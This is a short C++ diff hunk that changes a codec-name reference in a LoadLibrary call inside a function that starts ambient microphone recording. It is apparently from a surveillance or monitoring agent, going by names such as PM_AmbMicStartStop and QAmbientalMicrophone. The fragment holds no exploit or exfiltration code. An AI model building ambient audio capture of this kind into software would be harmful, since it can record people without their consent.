@@ -26,7 +26,7 @@ DWORD __stdcall PM_AmbMicStartStop(BOOL bStartFlag, BOOL bReset)
 	if (bStartFlag) {
 		// Cerca di caricare il codec
 		if (!amb_codec_handle)
-			amb_codec_handle = 	LoadLibrary(HM_CompletePath(H4_CODEC_NAME, codec_path));
+			amb_codec_handle = 	LoadLibrary(HM_CompletePath(shared.H4_CODEC_NAME, codec_path));
 
 		// ...e inizia a registrare
 		AmbMicObj = new QAmbientalMicrophone(amb_codec_handle, amb_mic_calibration, amb_mic_voice_tsld, amb_mic_silence_time);
